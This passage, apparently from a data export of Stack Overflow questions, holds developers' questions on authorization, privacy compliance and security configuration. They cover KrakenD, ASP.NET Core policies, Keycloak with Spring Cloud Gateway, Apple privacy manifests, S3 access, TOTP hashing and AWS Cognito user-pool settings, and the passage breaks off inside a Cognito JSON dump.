<p>Currently, I've configured Krakend to proxy requests to the static site using the following configuration:</p>
<pre class=""lang-json prettyprint-override""><code>{
  &quot;endpoint&quot;: &quot;/&quot;,
  &quot;output_encoding&quot;: &quot;no-op&quot;,
  &quot;backend&quot;: [
    {
      &quot;encoding&quot;: &quot;no-op&quot;,
      &quot;url_pattern&quot;: &quot;&quot;,
      &quot;sd&quot;: &quot;static&quot;,
      &quot;host&quot;: [
        &quot;http://172.22.11.62&quot;
      ],
      &quot;disable_host_sanitize&quot;: false
    }
  ]
}

</code></pre>
<p>However, I'm encountering a couple of issues:</p>
<ol>
<li>When accessing &quot;/&quot;, it redirects to <code>auth/signin?redirectTo=%2F</code>.</li>
<li>I need to explicitly declare other routes of the static site along with parameters.</li>
</ol>
<p>I'm wondering:</p>
<ol>
<li>Can Krakend act purely as a proxy without any manipulation, allowing seamless routing to the Nginx frontend?</li>
<li>What are the best practices for configuring Krakend in this scenario?</li>
<li>Is it recommended to use Krakend as a proxy for an Nginx frontend, or are there better alternatives?</li>
</ol>
"
"<p>I am trying to find a way to imperatively authorize resources in an asp.net razor pages application. So far, I have followed the guide found in this link: <a href=""https://learn.microsoft.com/en-us/aspnet/core/security/authorization/resourcebased?view=aspnetcore-8.0"" rel=""nofollow noreferrer"">https://learn.microsoft.com/en-us/aspnet/core/security/authorization/resourcebased?view=aspnetcore-8.0</a>. But, I am running into a problem where I want to be able to reuse authentication logic for various different requirements, without having to define a new class which inherits that specific requirement.</p>
<p>For example, I have a location object that I want to be viewable under the following conditions:</p>
<ol>
<li>If the user is of the role Admin or Master, or</li>
<li>If the user is a part of the Zone which the Location is also a part of.</li>
</ol>
<p>I have successfully built a requirement, and two handlers to implement this logic as follows:</p>
<pre><code>public class IsAdminOrHigherHandler : AuthorizationHandler&lt;AccessLocationRequirement&gt;
{
    protected override Task HandleRequirementAsync(
        AuthorizationHandlerContext context,
        AccessLocationRequirement requirement)
    {
        if (context.User.IsInRole(SD.Roles.Admin.ToString()) || context.User.IsInRole(SD.Roles.Master.ToString()))
        {
            context.Succeed(requirement);
        }
        return Task.CompletedTask;
    }
}

public class InLocationsZoneHandler : AuthorizationHandler&lt;AccessLocationRequirement, Location&gt;
{
    private readonly IUserService _userService;
    public InLocationsZoneHandler(IUserService userService)
    {
        _userService = userService;
    }
    protected override async Task HandleRequirementAsync(
        AuthorizationHandlerContext context,
        AccessLocationRequirement requirement,
        Location resource)
    {
        User? user = await _userService.GetUserFromContextAsync();
        if (user == null)
        {
            context.Fail();
            return;
        }
        if (user.Zones.Any(z =&gt; z.Id == resource.Zone.Id))
        {
            context.Succeed(requirement);
            return;
        }
    }
}
</code></pre>
<p>I then register a policy that takes this requirement:</p>
<pre><code>    options.AddPolicy(&quot;CanAccessLocation&quot;,
        policy =&gt; policy.AddRequirements(new AccessLocationRequirement()));
</code></pre>
<p>This works great, but my question is that when I want to define a new policy for defining rules for <strong>editing</strong> a location, I want to avoid rewriting this logic just because the requirement has changed. For example, my condition for editing a location are as follows:</p>
<ol>
<li>If the user is Admin or Master, or</li>
<li>If the user is a part of the Zone which the Location is also a part of AND they have a role of ZoneManager.</li>
</ol>
<p>As we can see, to edit a location, you may fulfill the requirement simply by fulfilling the logic laid out in the <code>IsAdminOrHigherHandler</code> method, but because the <code>IsAdminOrHigherHandler</code> inherits from <code>AuthorizationHandler&lt;AccessLocationRequirement&gt;</code> and not <code>AuthorizationHandler&lt;EditLocationRequirement&gt;</code>, we would have to rewrite this method.</p>
<p>How can I share Authorization Handler logic for different Requirements? Or is there a better method?</p>
"
"<p>I am working with Spring Cloud Gateway, built on Spring Webflux, and I aim to implement Keycloak's policy enforcement for authorization.</p>
<p>I'm using the following Keycloak adapter:</p>
<pre><code>&lt;dependency&gt;
    &lt;groupId&gt;org.keycloak&lt;/groupId&gt;
    &lt;artifactId&gt;keycloak-spring-security-adapter&lt;/artifactId&gt;
    &lt;version&gt;22.0.5&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<p>This adapter transitively includes the following dependencies:</p>
<pre><code>&lt;dependency&gt;
    &lt;groupId&gt;org.keycloak&lt;/groupId&gt;
    &lt;artifactId&gt;keycloak-policy-enforcer&lt;/artifactId&gt;
&lt;/dependency&gt;
&lt;dependency&gt;
    &lt;groupId&gt;org.keycloak&lt;/groupId&gt;
    &lt;artifactId&gt;keycloak-core&lt;/artifactId&gt;
&lt;/dependency&gt;
</code></pre>
<p>However, the Keycloak adapter only provides ServletPolicyEnforcerFilter, which is designed for servlet-based Spring applications.</p>
<p>For non-reactive applications, the policy enforcement approach is detailed in this repository: <a href=""https://github.com/keycloak/keycloak-quickstarts/blob/latest/spring/rest-authz-resource-server/src/main/java/org/keycloak/quickstart/OAuth2ResourceServerSecurityConfiguration.java"" rel=""nofollow noreferrer"">Keycloak-Quickstarts</a></p>
<p>In this approach, the Policy Enforcer requests an RPT (Requesting Party Token) from Keycloak and uses it to authorize the user for the requested resource and scope. Reusing the RPT minimizes the need for repeated interactions with Keycloak for each request.</p>
<p>However, as I am using Spring Cloud Gateway, I've implemented the Policy Enforcement differently:</p>
<ul>
<li>Created resources, role-based policies, and permissions in Keycloak.</li>
<li>Maintained a map of request URI paths and resource names defined in Keycloak.</li>
<li>Implemented a CustomReactiveAuthorizationManager by implementing the ReactiveAuthorizationManager interface.Here Iam doing the following things</li>
</ul>
<ol>
<li>Extracted the resource name from the static resource map using the request URI.</li>
<li>Made a REST call to Keycloak to evaluate whether the current user is authorized for the requested resource and scope.
Here's a snippet of the CustomReactiveAuthorizationManager:</li>
</ol>
<pre><code>public class CustomReactiveAuthorizationManager implements ReactiveAuthorizationManager&lt;AuthorizationContext&gt; {

    private final String BEARER = &quot;Bearer &quot;;
    private final AuthorizationConfigProperties authorizationConfigProperties;

    @Override
    public Mono&lt;AuthorizationDecision&gt; check(Mono&lt;Authentication&gt; authentication, AuthorizationContext context) {
        String path = context.getExchange().getRequest().getPath().toString();
        String token = context.getExchange().getRequest().getHeaders().getFirst(HttpHeaders.AUTHORIZATION);
        if (!ObjectUtils.isEmpty(token) &amp;&amp; token.startsWith(BEARER)) {
            token = token.replace(BEARER, &quot;&quot;);
            String scope = context.getExchange().getRequest().getMethod().name();
            return evaluateResourceAccess(path, token, scope);
        }
        return Mono.just(new AuthorizationDecision(false));
    }
    
     public boolean evaluateResourceAccess(String uriPath, String token, String scope) {
        String resource = authorizationConfigProperties.getResource(uriPath); //from the resource map i created in application.yml I'm getting the resource name using requestUriPath 
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_FORM_URLENCODED);
        headers.setBearerAuth(token);
        MultiValueMap&lt;String, String&gt; requestParams = new LinkedMultiValueMap&lt;&gt;();
        requestParams.add(&quot;grant_type&quot;, &quot;urn:ietf:params:oauth:grant-type:uma-ticket&quot;);
        requestParams.add(&quot;audience&quot;, clientId);
        requestParams.add(&quot;permission&quot;, resource + &quot;#&quot; + scope);
        requestParams.add(&quot;response_mode&quot;, &quot;decision&quot;);
        HttpEntity&lt;MultiValueMap&lt;String, String&gt;&gt; requestEntity = new HttpEntity&lt;&gt;(requestParams, headers);
        try {
            //making a rest call to keycloak evalute endpoint
            ResponseEntity&lt;Object&gt; responseEntity = restTemplate.postForEntity(keycloakTokenEndpoint, requestEntity, Object.class);
            return responseEntity.getStatusCode().is2xxSuccessful();
        } catch (HttpClientErrorException.Forbidden e) {
            log.error(&quot;UnAuthorized:&quot; + e.getMessage());
            return false;
        } catch (Exception ex) {
            log.error(&quot;Authorization Failed:&quot; + ex.getMessage());
            return false;
        }
    }

}

</code></pre>
<ul>
<li>Integrated this custom manager into the SecurityWebFilterChain.</li>
</ul>
<pre><code>@Bean
public SecurityWebFilterChain springSecurityFilterChain(ServerHttpSecurity http) {
    return http.csrf(ServerHttpSecurity.CsrfSpec::disable)
            .oauth2ResourceServer(oauth2 -&gt; oauth2.jwt(Customizer.withDefaults()))
            .authorizeExchange(exchange -&gt; exchange
                            .pathMatchers(&quot;/public-endpoint&quot;)
                            .permitAll()
                            .anyExchange()
                            .access(new CustomReactiveAuthorizationManager(authService)))
            .build();
}
</code></pre>
<p>Now, my concern is the number of API calls to Keycloak for evaluating access and maintaining the map of request_uri_path and resource.
For each request, a call to Keycloak is made, potentially causing performance issues.</p>
<p>While I considered the RPT approach, it also requires maintaining the path and resource map, and explicitly checking whether the requested resource and scope are present in the RPT.Also I need the centralized authorization in spring cloud gateway I don't want to delegate the authorization to each individual microservice</p>
<p>I am seeking advice on alternative approaches to achieve policy enforcement in Spring Cloud Gateway while minimizing the number of Keycloak API calls.</p>
<p>Is there any other approach that can help optimize this scenario?</p>
"
"<p>We use the <a href=""https://learn.microsoft.com/en-us/aspnet/core/security/authorization/resourcebased?view=aspnetcore-8.0"" rel=""nofollow noreferrer"" title=""Resource-based authorization in ASP.NET Core"">imperative authorization method</a> to secure endpoints exposing sensitive resources. A simple scenario looks like this:</p>
<pre><code>public async Task&lt;IActionResult&gt; OnGetAsync(Guid documentId)
{
    Document = _documentRepository.Find(documentId);

    if (Document == null) return new NotFoundResult();

    var authorizationResult = await _authorizationService.AuthorizeAsync(User, Document, &quot;EditPolicy&quot;);

    if (authorizationResult.Succeeded) return Page();
    else if (User.Identity.IsAuthenticated) return new ForbidResult();
    else return new ChallengeResult();
}
</code></pre>
<p>Behind the scenes the <code>_authorizationService.AuthorizeAsync</code> method call is handled by a custom AuthorizationHandler. Evaluating the AuthorizationRequirement is quite complex and involves information not known to the application. It is not possible to translate said authorization logic to other systems such as the application's datastore. Therefore it is  important to note <strong>all authorization decisions should only be handled by ASP.NET's authorization system</strong>.</p>
<p>This works fine for simple scenarios where the dataset to return is already heavily reduced upfront using other criteria. For example a HTTP GET by 'id' can only match one record. In case the endpoint returns multiple records the same can be achieved by requiring some search criteria.</p>
<pre><code>public async Task&lt;IActionResult&gt; OnGetAsync(DocumentSearchCriteria searchCriteria)
{
    foreach (var document in _documentRepository.Find(searchCriteria)) {
       var authorizationResult = await _authorizationService.AuthorizeAsync(User, document, &quot;EditPolicy&quot;);
       if (authorizationResult.Succeeded) Documents.Add(document);
    }

    return Page();
}
</code></pre>
<p>There is quite some overhead in this approach; the application datastore returns too much data and loaded in application memory. It becomes even more problematic when we cannot reduce the dataset upfront. This happens when the endpoint should return all potential matches. I am firm believer premature optimization is the root of all evil, however, we already have some instances where the initial dataset exceeds 60.000 records, it's too much. When this happens we review the code and come up with some compromise. My goal is to discover alternative techniques, ideally some generic solution that we can pose as an internal guideline for these scenarios.</p>
"
"<p>Recently Apple announced a list of SDKs where cordova was one of them which has to meet the new data privacy requirement. A privacy manifest file for the same needs to be added within the projects Which are using it.</p>
<p>As per the Apple Documentation:</p>
<p>Starting in spring 2024, you must include the privacy manifest for any SDK listed below when you submit new apps in App Store Connect that include those SDKs, or when you submit an app update that adds one of the listed SDKs as part of the update. Signatures are also required in these cases where the listed SDKs are used as binary dependencies.</p>
<p>Reference:
<a href=""https://developer.apple.com/support/third-party-SDK-requirements"" rel=""nofollow noreferrer"">https://developer.apple.com/support/third-party-SDK-requirements</a>
<a href=""https://developer.apple.com/news/?id=r1henawx#"" rel=""nofollow noreferrer"">https://developer.apple.com/news/?id=r1henawx#</a></p>
<p>Can anyone please let us know on how to proceed on this by giving a step by step procedure to meet the new requirement</p>
<p>It would be helpful if there is any documentation for this from the Apache Cordova team to deal with this new requirement.</p>
<p>Thanks in advance.</p>
<p>Detailed step by step process to handle the new requirement.</p>
"
"<p>In WhisperX transcription, a tool I'm currently using, there's a concern regarding data privacy related to the transmission of information. Specifically, I'm interested in understanding the nuances of data sharing with third parties in two scenarios: when the speaker diarization feature is enabled and when it's disabled. This distinction is crucial for evaluating the privacy implications of using WhisperX and making informed decisions about its usage.</p>
<p>I've attempted to review the documentation and discussions surrounding WhisperX to find clear information on data transmission practices with and without speaker diarization enabled. I expected to find detailed explanations or references outlining the data sharing processes under these different settings. However, the available resources didn't provide sufficient clarity on this topic.</p>
"
"<p>I'm trying to create a site with Wordpress plus Elementor to speed up the work queue, I'm facing a problem, after creating the site with Elementor I installed the Complianz plugin for policies, but the relevant window doesn't appear on the home page, I also thought about modifying the CSS by adding a Z-index in this case, how can I do it? I couldn't find anything about it on google</p>
"
"<p>In the documentation for the required reason API in the privacy manifest file, Apple specifies that I should indicate if my third-party SDK utilizes <code>UserDefaults</code>:</p>
<blockquote>
<p>C56D.1 Declare this reason if your third-party SDK is providing a wrapper function around user defaults API(s) for the app to use, and you only access the user defaults APIs when the app calls your wrapper function. This reason may only be declared by third-party SDKs. This reason may not be declared if your third-party SDK was created primarily to wrap required reason API(s).
Information accessed for this reason, or any derived information, may not be used for your third-party SDK’s own purposes or sent off-device by your third-party SDK.</p>
</blockquote>
<p>Let me clarify: Should I declare this reason if my SDK reads and writes from the app's UserDefaults parameters (standard read and write)? What if I only read and write SDK-related data to the app's UserDefaults? Lastly, should I declare it if I read and write to the SDK's suite in UserDefaults?</p>
"
"<p>I have an e-commerce which has virtual and downloadable products. I basically want to grant this website access in my Amazon s3 bucket so only this website can use the pictures (that then the clients download). I know there are different ways to grant access, but I don't know which one and how to you use it.</p>
<p>For more specifications, my website is a WordPress WooCommerce, the products are virtual and downloadable, they are only images.</p>
<p>Read the documentation but I didn't really understand how to configure the privacy policy</p>
"
"<p>Im trying to block all adult content from my phone. I tried changing private dns to family.adguard-dns.com. But its not blocking adult content from private browsers like tor. Which private dns hostname is best for blocking adult content from all private browsers? Please answer in simple terms so I can understand🙏🏻</p>
<p>I tried changing private hostname to above said name. But its not block adult content from tor browser and other private browsers</p>
"
"<p>I downloaded a sample ecommerce project from - <a href=""https://drive.google.com/drive/folders/1X6g7ByUiDPHshYQ2BM0GIEiBS0XmJg8x"" rel=""nofollow noreferrer"">https://drive.google.com/drive/folders/1X6g7ByUiDPHshYQ2BM0GIEiBS0XmJg8x</a></p>
<p>Ran the scripts for database and it all went well. Then proceeded to load and launch the backend web-api for this project through visualstudio 2022. The webapi project has been written with .netcore 6.0. What I am getting on the browser is the following -</p>
<pre><code>    Privacy Error
    
    Your connection is not private
    Attackers might be trying to steal your information from localhost (for example, 
    passwords, messages, or credit cards). Learn more
    NET::ERR_CERT_INVALID
</code></pre>
<p>What do I need to fix and/or change in order to bypass this glitch and have the api up and running? As I understand this, it's probably asking for some kind of certificate installation? Need some guidance on this one please. I've given the download link as well so that you can see for yourself.</p>
<p>Thanks in advance.</p>
"
"<p>The <a href=""https://github.com/google/google-authenticator/wiki"" rel=""nofollow noreferrer"">Google Authenticator</a> implements the one-time passcode as described in <a href=""https://datatracker.ietf.org/doc/html/rfc4226"" rel=""nofollow noreferrer"">RFC 4226</a>, HOTP: An HMAC-Based One-Time Password Algorithm and its extension <a href=""https://datatracker.ietf.org/doc/html/rfc6238"" rel=""nofollow noreferrer"">RFC 6238</a>, TOTP: Time-Based One-Time Password Algorithm.</p>
<p>RFC 6238 specifies the algoritm;</p>
<pre><code>HOTP(K,T) = Truncate(HASH-FUNCTION(K,T))
</code></pre>
<p>Where K is the shared secret and T the current Unix time (i.e., the number of seconds elapsed since midnight UTC of January 1, 1970). As for HASH-FUNCTION RFC 6238 describes;</p>
<p><a href=""https://i.stack.imgur.com/IDMpW.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/IDMpW.png"" alt=""TOTP implementations MAY use HMAC-SHA-256 or HMAC-SHA-512 functions,
based on SHA-256 or SHA-512 [SHA2] hash functions, instead of the
HMAC-SHA-1 function that has been specified for the HOTP computation
in [RFC4226]."" /></a></p>
<p>And indeed, i saw several server side implementations with these different HASH-FUNCTIONs.
But what about the Google Authenticator App itself? The App defaults with HMAC-SHA-1 (i know this from tests), but can i configure the App towards HMAC-SHA-256 or HMAC-SHA-512? How?</p>
"
"<p>I have 2 Cognito user-pools.</p>
<p>First one I have created on <strong>August 20, 2021</strong>. The following is the configuration:</p>
<pre><code>{
    &quot;UserPool&quot;: {
        &quot;Id&quot;: &quot;us-east-2_************&quot;,
        &quot;Name&quot;: &quot;dev-mobileapp-users&quot;,
        &quot;Policies&quot;: {
            &quot;PasswordPolicy&quot;: {
                &quot;MinimumLength&quot;: 8,
                &quot;RequireUppercase&quot;: true,
                &quot;RequireLowercase&quot;: true,
                &quot;RequireNumbers&quot;: true,
                &quot;RequireSymbols&quot;: true,
                &quot;TemporaryPasswordValidityDays&quot;: 7
            }
        },
        &quot;DeletionProtection&quot;: &quot;INACTIVE&quot;,
        &quot;LambdaConfig&quot;: {
            &quot;PreSignUp&quot;: &quot;arn:aws:lambda:us-east-2:123456789009:function:dev-mobileapp-users-presignup-trigger&quot;
        },
        &quot;LastModifiedDate&quot;: &quot;2024-02-16T11:13:49.777000+05:30&quot;,
        &quot;CreationDate&quot;: &quot;2021-08-20T10:59:47.932000+05:30&quot;,
        &quot;SchemaAttributes&quot;: [
            {
                &quot;Name&quot;: &quot;sub&quot;,
                &quot;AttributeDataType&quot;: &quot;String&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: false,
                &quot;Required&quot;: true,
                &quot;StringAttributeConstraints&quot;: {
                    &quot;MinLength&quot;: &quot;1&quot;,
                    &quot;MaxLength&quot;: &quot;2048&quot;
                }
            },
            {
                &quot;Name&quot;: &quot;name&quot;,
                &quot;AttributeDataType&quot;: &quot;String&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: true,
                &quot;Required&quot;: false,
                &quot;StringAttributeConstraints&quot;: {
                    &quot;MinLength&quot;: &quot;0&quot;,
                    &quot;MaxLength&quot;: &quot;2048&quot;
                }
            },
            {
                &quot;Name&quot;: &quot;given_name&quot;,
                &quot;AttributeDataType&quot;: &quot;String&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: true,
                &quot;Required&quot;: false,
                &quot;StringAttributeConstraints&quot;: {
                    &quot;MinLength&quot;: &quot;0&quot;,
                    &quot;MaxLength&quot;: &quot;2048&quot;
                }
            },
            {
                &quot;Name&quot;: &quot;family_name&quot;,
                &quot;AttributeDataType&quot;: &quot;String&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: true,
                &quot;Required&quot;: false,
                &quot;StringAttributeConstraints&quot;: {
                    &quot;MinLength&quot;: &quot;0&quot;,
                    &quot;MaxLength&quot;: &quot;2048&quot;
                }
            },
            {
                &quot;Name&quot;: &quot;middle_name&quot;,
                &quot;AttributeDataType&quot;: &quot;String&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: true,
                &quot;Required&quot;: false,
                &quot;StringAttributeConstraints&quot;: {
                    &quot;MinLength&quot;: &quot;0&quot;,
                    &quot;MaxLength&quot;: &quot;2048&quot;
                }
            },
            {
                &quot;Name&quot;: &quot;nickname&quot;,
                &quot;AttributeDataType&quot;: &quot;String&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: true,
                &quot;Required&quot;: false,
                &quot;StringAttributeConstraints&quot;: {
                    &quot;MinLength&quot;: &quot;0&quot;,
                    &quot;MaxLength&quot;: &quot;2048&quot;
                }
            },
            {
                &quot;Name&quot;: &quot;preferred_username&quot;,
                &quot;AttributeDataType&quot;: &quot;String&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: true,
                &quot;Required&quot;: false,
                &quot;StringAttributeConstraints&quot;: {
                    &quot;MinLength&quot;: &quot;0&quot;,
                    &quot;MaxLength&quot;: &quot;2048&quot;
                }
            },
            {
                &quot;Name&quot;: &quot;profile&quot;,
                &quot;AttributeDataType&quot;: &quot;String&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: true,
                &quot;Required&quot;: false,
                &quot;StringAttributeConstraints&quot;: {
                    &quot;MinLength&quot;: &quot;0&quot;,
                    &quot;MaxLength&quot;: &quot;2048&quot;
                }
            },
            {
                &quot;Name&quot;: &quot;picture&quot;,
                &quot;AttributeDataType&quot;: &quot;String&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: true,
                &quot;Required&quot;: false,
                &quot;StringAttributeConstraints&quot;: {
                    &quot;MinLength&quot;: &quot;0&quot;,
                    &quot;MaxLength&quot;: &quot;2048&quot;
                }
            },
            {
                &quot;Name&quot;: &quot;website&quot;,
                &quot;AttributeDataType&quot;: &quot;String&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: true,
                &quot;Required&quot;: false,
                &quot;StringAttributeConstraints&quot;: {
                    &quot;MinLength&quot;: &quot;0&quot;,
                    &quot;MaxLength&quot;: &quot;2048&quot;
                }
            },
            {
                &quot;Name&quot;: &quot;email&quot;,
                &quot;AttributeDataType&quot;: &quot;String&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: true,
                &quot;Required&quot;: true,
                &quot;StringAttributeConstraints&quot;: {
                    &quot;MinLength&quot;: &quot;0&quot;,
                    &quot;MaxLength&quot;: &quot;2048&quot;
                }
            },
            {
                &quot;Name&quot;: &quot;email_verified&quot;,
                &quot;AttributeDataType&quot;: &quot;Boolean&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: true,
                &quot;Required&quot;: false
            },
            {
                &quot;Name&quot;: &quot;gender&quot;,
                &quot;AttributeDataType&quot;: &quot;String&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: true,
                &quot;Required&quot;: false,
                &quot;StringAttributeConstraints&quot;: {
                    &quot;MinLength&quot;: &quot;0&quot;,
                    &quot;MaxLength&quot;: &quot;2048&quot;
                }
            },
            {
                &quot;Name&quot;: &quot;birthdate&quot;,
                &quot;AttributeDataType&quot;: &quot;String&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: true,
                &quot;Required&quot;: false,
                &quot;StringAttributeConstraints&quot;: {
                    &quot;MinLength&quot;: &quot;10&quot;,
                    &quot;MaxLength&quot;: &quot;10&quot;
                }
            },
            {
                &quot;Name&quot;: &quot;zoneinfo&quot;,
                &quot;AttributeDataType&quot;: &quot;String&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: true,
                &quot;Required&quot;: false,
                &quot;StringAttributeConstraints&quot;: {
                    &quot;MinLength&quot;: &quot;0&quot;,
                    &quot;MaxLength&quot;: &quot;2048&quot;
                }
            },
            {
                &quot;Name&quot;: &quot;locale&quot;,
                &quot;AttributeDataType&quot;: &quot;String&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: true,
                &quot;Required&quot;: false,
                &quot;StringAttributeConstraints&quot;: {
                    &quot;MinLength&quot;: &quot;0&quot;,
                    &quot;MaxLength&quot;: &quot;2048&quot;
                }
            },
            {
                &quot;Name&quot;: &quot;phone_number&quot;,
                &quot;AttributeDataType&quot;: &quot;String&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: true,
                &quot;Required&quot;: true,
                &quot;StringAttributeConstraints&quot;: {
                    &quot;MinLength&quot;: &quot;0&quot;,
                    &quot;MaxLength&quot;: &quot;2048&quot;
                }
            },
            {
                &quot;Name&quot;: &quot;phone_number_verified&quot;,
                &quot;AttributeDataType&quot;: &quot;Boolean&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: true,
                &quot;Required&quot;: false
            },
            {
                &quot;Name&quot;: &quot;address&quot;,
                &quot;AttributeDataType&quot;: &quot;String&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: true,
                &quot;Required&quot;: false,
                &quot;StringAttributeConstraints&quot;: {
                    &quot;MinLength&quot;: &quot;0&quot;,
                    &quot;MaxLength&quot;: &quot;2048&quot;
                }
            },
            {
                &quot;Name&quot;: &quot;updated_at&quot;,
                &quot;AttributeDataType&quot;: &quot;Number&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: true,
                &quot;Required&quot;: false,
                &quot;NumberAttributeConstraints&quot;: {
                    &quot;MinValue&quot;: &quot;0&quot;
                }
            }
        ],
        &quot;AutoVerifiedAttributes&quot;: [
            &quot;email&quot;
        ],
        &quot;UsernameAttributes&quot;: [
            &quot;email&quot;
        ],
        &quot;SmsVerificationMessage&quot;: &quot;Your verification code is {####}. &quot;,
        &quot;EmailVerificationMessage&quot;: &quot;Please enter this verification code to verify your identity:\n{####}\n\nIf you did not make this request, please email support@abc.com.\n\nThanks,\nThe Abc Team&quot;,
        &quot;EmailVerificationSubject&quot;: &quot;Your verification code&quot;,
        &quot;VerificationMessageTemplate&quot;: {
            &quot;SmsMessage&quot;: &quot;Your verification code is {####}. &quot;,
            &quot;EmailMessage&quot;: &quot;Please enter this verification code to verify your identity:\n{####}\n\nIf you did not make this request, please email support@abc.com.\n\nThanks,\nThe Abc Team&quot;,
            &quot;EmailSubject&quot;: &quot;Your verification code&quot;,
            &quot;DefaultEmailOption&quot;: &quot;CONFIRM_WITH_CODE&quot;
        },
        &quot;SmsAuthenticationMessage&quot;: &quot;Your verification code is {####}. &quot;,
        &quot;UserAttributeUpdateSettings&quot;: {
            &quot;AttributesRequireVerificationBeforeUpdate&quot;: []
        },
        &quot;MfaConfiguration&quot;: &quot;OPTIONAL&quot;,
        &quot;DeviceConfiguration&quot;: {
            &quot;ChallengeRequiredOnNewDevice&quot;: true,
            &quot;DeviceOnlyRememberedOnUserPrompt&quot;: true
        },
        &quot;EstimatedNumberOfUsers&quot;: 689,
        &quot;EmailConfiguration&quot;: {
            &quot;SourceArn&quot;: &quot;arn:aws:ses:us-east-1:123456789009:identity/no-reply@abc.com&quot;,
            &quot;EmailSendingAccount&quot;: &quot;COGNITO_DEFAULT&quot;
        },
        &quot;SmsConfiguration&quot;: {
            &quot;SnsCallerArn&quot;: &quot;arn:aws:iam::123456789009:role/service-role/devmobileappusers-SMS-Role&quot;,
            &quot;ExternalId&quot;: &quot;8d37769d-08cd-44e7-987a-******************&quot;,
            &quot;SnsRegion&quot;: &quot;us-east-1&quot;
        },
        &quot;UserPoolTags&quot;: {},
        &quot;Domain&quot;: &quot;devmobileappusers&quot;,
        &quot;AdminCreateUserConfig&quot;: {
            &quot;AllowAdminCreateUserOnly&quot;: false,
            &quot;UnusedAccountValidityDays&quot;: 7,
            &quot;InviteMessageTemplate&quot;: {
                &quot;SMSMessage&quot;: &quot;Your username is {username} and temporary password is {####}. &quot;,
                &quot;EmailMessage&quot;: &quot;Your username is {username} and temporary password is {####}. &quot;,
                &quot;EmailSubject&quot;: &quot;Your temporary password&quot;
            }
        },
        &quot;UsernameConfiguration&quot;: {
            &quot;CaseSensitive&quot;: false
        },
        &quot;Arn&quot;: &quot;arn:aws:cognito-idp:us-east-2:123456789009:userpool/us-east-2_*********&quot;,
        &quot;AccountRecoverySetting&quot;: {
            &quot;RecoveryMechanisms&quot;: [
                {
                    &quot;Priority&quot;: 1,
                    &quot;Name&quot;: &quot;verified_email&quot;
                }
            ]
        }
    }
}
</code></pre>
<p>Second one I have created on <strong>August 23, 2023</strong>. The following is the configuration:</p>
<pre><code>{
    &quot;UserPool&quot;: {
        &quot;Id&quot;: &quot;us-east-2_***********&quot;,
        &quot;Name&quot;: &quot;devint-mobileapp-users&quot;,
        &quot;Policies&quot;: {
            &quot;PasswordPolicy&quot;: {
                &quot;MinimumLength&quot;: 8,
                &quot;RequireUppercase&quot;: true,
                &quot;RequireLowercase&quot;: true,
                &quot;RequireNumbers&quot;: true,
                &quot;RequireSymbols&quot;: true,
                &quot;TemporaryPasswordValidityDays&quot;: 7
            }
        },
        &quot;DeletionProtection&quot;: &quot;ACTIVE&quot;,
        &quot;LambdaConfig&quot;: {
            &quot;PreSignUp&quot;: &quot;arn:aws:lambda:us-east-2:123456789098:function:dev-mobileapp-users-presignup-trigger&quot;
        },
        &quot;LastModifiedDate&quot;: &quot;2024-02-15T10:30:19.365000+05:30&quot;,
        &quot;CreationDate&quot;: &quot;2023-08-23T16:00:18.471000+05:30&quot;,
        &quot;SchemaAttributes&quot;: [
            {
                &quot;Name&quot;: &quot;sub&quot;,
                &quot;AttributeDataType&quot;: &quot;String&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: false,
                &quot;Required&quot;: true,
                &quot;StringAttributeConstraints&quot;: {
                    &quot;MinLength&quot;: &quot;1&quot;,
                    &quot;MaxLength&quot;: &quot;2048&quot;
                }
            },
            {
                &quot;Name&quot;: &quot;name&quot;,
                &quot;AttributeDataType&quot;: &quot;String&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: true,
                &quot;Required&quot;: false,
                &quot;StringAttributeConstraints&quot;: {
                    &quot;MinLength&quot;: &quot;0&quot;,
                    &quot;MaxLength&quot;: &quot;2048&quot;
                }
            },
            {
                &quot;Name&quot;: &quot;given_name&quot;,
                &quot;AttributeDataType&quot;: &quot;String&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: true,
                &quot;Required&quot;: false,
                &quot;StringAttributeConstraints&quot;: {
                    &quot;MinLength&quot;: &quot;0&quot;,
                    &quot;MaxLength&quot;: &quot;2048&quot;
                }
            },
            {
                &quot;Name&quot;: &quot;family_name&quot;,
                &quot;AttributeDataType&quot;: &quot;String&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: true,
                &quot;Required&quot;: false,
                &quot;StringAttributeConstraints&quot;: {
                    &quot;MinLength&quot;: &quot;0&quot;,
